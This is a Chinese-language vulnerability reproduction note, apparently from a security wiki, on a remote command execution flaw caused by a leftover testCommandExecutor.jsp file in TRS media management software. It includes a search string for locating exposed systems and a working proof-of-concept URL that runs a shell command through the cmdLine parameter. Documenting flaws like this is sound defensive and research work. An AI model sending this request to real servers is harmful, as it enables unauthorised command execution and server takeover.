---
title: "拓尔思 TRS testCommandExecutor.jsp 远程命令执行漏洞"
date: 2026-10-16 09:10:44
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "拓尔思-TRS"
tags:
  - "拓尔思-TRS"
  - "命令执行"
  - "漏洞复现"
---
## 漏洞描述

拓尔思 TRS testCommandExecutor.jsp测试文件存在远程命令执行漏洞，当网站运维者未删除测试文件时，攻击者通过漏洞可以获取服务器权限

## 漏洞影响

```
拓尔思-TRS
```

## 网络测绘

```
"TRS媒资管理系统登录页面"
```

## 漏洞复现

主页面

![image-20230314084307993](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20230314084307993.png)

验证POC

```
/mas/front/vod/main.do?method=newList&view=forward:/sysinfo/testCommandExecutor.jsp&cmdLine=dir&workDir=&pathEnv=&libPathEnv=
```

![image-20230314084331676](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20230314084331676.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/%E6%8B%93%E5%B0%94%E6%80%9D-TRS-testCommandExecutor.jsp-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md)
